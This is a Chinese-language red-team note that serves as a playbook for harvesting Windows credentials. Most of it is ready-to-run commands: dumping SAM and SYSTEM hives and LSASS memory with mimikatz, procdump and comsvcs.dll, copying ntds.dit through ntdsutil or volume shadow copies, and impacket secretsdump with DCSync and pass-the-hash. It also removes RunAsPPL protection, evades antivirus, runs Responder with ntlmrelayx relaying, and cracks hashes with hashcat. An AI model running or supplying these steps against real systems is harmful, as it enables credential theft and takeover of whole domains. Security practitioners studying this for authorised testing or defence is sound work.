# Windows Hash 与明文凭证获取

## 0x00 概述

本篇记录 Windows 环境下几类常见认证材料：

- `LM Hash`
- `NTLM Hash`
- `Net-NTLM Hash`
- LSASS 内存中的明文或票据相关信息

适用场景通常分为两类：

- 已拿到管理员权限，准备离线导出或转存凭证材料。
- 已能访问系统内存或关键文件，准备做本地分析。

基础参考：

- [Windows 下的密码 Hash 介绍](https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D)

## 0x01 离线获取 Hash
### 1. 导出SAM和SYSTEM表方法
#### （1）目标主机注册表导出文件
```
reg save HKLM\SYSTEM system.hive
reg save HKLM\SAM sam.hive
reg save hklm\security security.hive
```
#### （2）通过mimikatz导出Hash

```
$ ./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::sam /sam:sam.hive /system:system.hive
```
### 2. 导出lsass进程内存方法

#### （1）目标主机lsass.exe dump内存

- [内网渗透-免杀抓取windows hash](https://www.freebuf.com/column/231880.html)介绍了一些方法，主要是为了过杀软，如果能登录3389可以直接用任务管理器右键导出lsass.exe的内存。
- 微软VStudio2022自带的dumpminitool程序也可以免杀，毕竟是微软自己的工具，找到lsass进程号，dump内存。

#### （2）通过mimikatz导出Hash
```
$ ./mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz# sekurlsa::minidump 1.bin
mimikatz# sekurlsa::loginpasswords full
```

### 3. 导出域Hash ntds,dit
```
# 创建快照
ntdsutil snapshot "activate instance ntds" create quit quit
GUID 为 {aa488f5b-40c7-4044-b24f-16fd041a6de2}

# 挂载快照
ntdsutil snapshot "mount GUID" quit quit

# 复制 ntds.dit
copy C:\$SNAP_201908200435_VOLUMEC$\windows\NTDS\ntds.dit c:\ntds.dit

# 卸载快照
ntdsutil snapshot "unmount GUID" quit quit

# 删除快照
ntdsutil snapshot "delete GUID" quit quit

# 查询快照
ntdsutil snapshot "List All" quit quit
ntdsutil snapshot "List Mounted" quit quit
 ```

### 4. vssadmin 卷影副本备选

与上面 ntdsutil 五步法互补，通过创建卷影副本（VSS）直接复制 `ntds.dit`，同样只需本地 SYSTEM 权限：

```
# 创建 C 盘卷影副本（记下回显中的卷影设备路径）
vssadmin create shadow /for=C:

# 从卷影副本中复制 ntds.dit 与 SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\SYSTEM c:\SYSTEM
```

## 0x02 impacket secretsdump

`secretsdump.py` 来自 impacket 套件，是域渗透中最常用的凭证导出工具，支持远程在线导出与本地离线解析。

### 在线导出（远程）

```
# 明文密码直连远程导出（域管账号对 DC 会自动尝试 DCSync）
secretsdump.py domain/user:pass@10.0.0.1

# Hash 传递方式（-hashes lm:ntlm，LM 部分为空）
secretsdump.py -hashes :ntlm domain/user@10.0.0.1

# 只走 DCSync 导出域内凭证（不落地 NTDS 文件，速度快）
secretsdump.py -just-dc domain/user:pass@10.0.0.1
```

### 离线导出（本地文件）

配合上文 ntdsutil / vssadmin 导出的 `ntds.dit` 与 `SYSTEM` 文件离线解析：

```
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lm:nt local
```

### 输出字段解读

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

- `500`：RID，`500` 固定为内置 Administrator
- 前半段 `aad3b435b51404eeaad3b435b51404ee`：LM Hash 固定占位值（LM 未启用/密码为空时的空 LM Hash）
- 后半段：NTLM Hash（`31d6cfe0d16ae931b73c59d7e0c089c0` 即空密码的 NTLM 值）
- 传递时格式为 `LM:NTLM`，LM 留空写作 `:NTLM`

## 0x03 主机获取明文密码

### 获取明文密码

>在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。
当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。
但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）

以下是支持的系统:
Windows 7
Windows 8
Windows 8.1
Windows Server 2008
Windows Server 2012
Windows Server 2012R 2

- 原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码
利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。
抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码

procdump64.exe导出lsass.dmp
```
procdump64.exe -accepteula -ma lsass.exe lsass.dmp
```
使用本地的mimikatz.exe读取lsass.dmp
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" "exit"
```

## 0x04 RunAsPPL 绕过

当目标启用 RunAsPPL（Protected Process Light）后，LSASS 以受保护进程运行，直接 OpenProcess 读取 lsass 内存会被拒绝（mimikatz 报 OpenProcess 错误）。可用绕过思路：

```
# 思路一：mimikatz 驱动移除保护（需管理员权限且允许加载驱动）
mimikatz # !+
mimikatz # !processprotect /remove /process:lsass.exe
# 移除 PPL 标志后即可正常 sekurlsa::logonPasswords

# 思路二：comsvcs.dll MiniDump（系统自带 DLL，先找到 lsass 的 PID）
rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\lsass.dmp full

# 思路三：Sysinternals 签名工具（部分 EDR 策略对微软签名工具放行的场景）
procdump -mp lsass.exe lsass.dmp
```

- 专用工具 [PPLdump](https://github.com/itm4n/PPLdump)：利用已知问题移除 LSASS 的 PPL 保护后再 dump。
- 高版本 Windows（HVCI/驱动签名强制）下 `!+` 加载驱动可能失败，优先考虑 comsvcs / 签名工具路线。

## 0x05 Net-NTLM Relay 思路

抓不到本地 Hash 时的另一条路：不破解、直接中继。`Responder` 毒化 LLMNR/NBT-NS 抓取内网主机的 Net-NTLM 认证，`ntlmrelayx`（impacket）将认证转发到目标机器，直接在目标上执行命令/导出 SAM：

```
# 攻击机先开中继监听（-tf 指定目标清单，-smb2support 支持 SMB2）
ntlmrelayx.py -tf targets.txt -smb2support

# 另一终端开启 Responder 抓取认证（需关闭其自带 SMB/HTTP 服务避免冲突）
responder -I eth0 -dwv
```

> 详细命令与限制条件（SMB 签名、EPA、Relay 到 LDAP/AD CS 等）见 [PEN-Kerberos.md](../penetration/PEN-Kerberos.md) 新增章节。

## 0x06 破解 Hash 
>超好用，可惜已经停止服务了
- [Ophcrack 在线破解](https://www.objectif-securite.ch/en/ophcrack)

- [Cmd5在线破解](https://www.cmd5.com/)

### 本地 hashcat 破解

```
# NTLM Hash（-m 1000）
hashcat -m 1000 ntlm.txt rockyou.txt
# LM Hash（-m 3000）
hashcat -m 3000 lm.txt rockyou.txt
```

常用参数：`-r rules/best64.rule` 规则变换加速、`-O` 优化内核、`--show` 查看已破解结果。

## 0x07 注意事项

- 离线导出 `SAM`、`SYSTEM`、`SECURITY` 时，最好一次性带全，避免后续解析不完整。
- 处理 `lsass.exe` 内存时，稳定性和查杀风险都明显高于注册表导出。
- 域控上导出 `ntds.dit` 风险最高，操作前先确认回收和清理路径。
- “能拿到 Hash” 不代表“能直接拿到明文”，两者后续处理方式不同。

## Ref

- https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D 
- https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html
- [内网渗透-免杀抓取windows hash](https://www.freebuf.com/column/231880.html)
- https://github.com/fortra/impacket （impacket 官方仓库，secretsdump 等）
- https://github.com/itm4n/PPLdump （PPLdump：RunAsPPL 绕过工具）
